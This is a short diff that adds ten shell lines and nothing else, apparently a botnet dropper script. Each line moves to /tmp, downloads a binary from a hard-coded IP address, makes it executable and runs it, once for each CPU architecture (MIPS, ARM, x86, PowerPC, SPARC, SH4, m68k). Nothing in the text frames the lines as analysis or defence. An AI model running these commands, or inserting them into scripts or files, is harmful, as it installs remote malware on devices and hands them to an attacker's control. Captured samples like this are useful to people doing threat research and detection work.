@@ -1,0 +1,10 @@
+cd /tmp && wget -q http://94.177.123.132/mymipsel && chmod +x mymipsel && ./mymipsel
+cd /tmp && wget -q http://94.177.123.132/mymips && chmod +x mymips && ./mymips
+cd /tmp && wget -q http://94.177.123.132/mysh4 && chmod +x mysh4 && ./mysh4
+cd /tmp && wget -q http://94.177.123.132/myx86 && chmod +x myx86 && ./myx86
+cd /tmp && wget -q http://94.177.123.132/myarmv6 && chmod +x myarmv6 && ./myarmv6
+cd /tmp && wget -q http://94.177.123.132/myi686 && chmod +x myi686 && ./myi686
+cd /tmp && wget -q http://94.177.123.132/mypowerpc && chmod +x mypowerpc && ./mypowerpc
+cd /tmp && wget -q http://94.177.123.132/myi586 && chmod +x myi586 && ./myi586
+cd /tmp && wget -q http://94.177.123.132/mym86k && chmod +x mym86k && ./mym86k
+cd /tmp && wget -q http://94.177.123.132/mysparc && chmod +x mysparc && ./mysparc
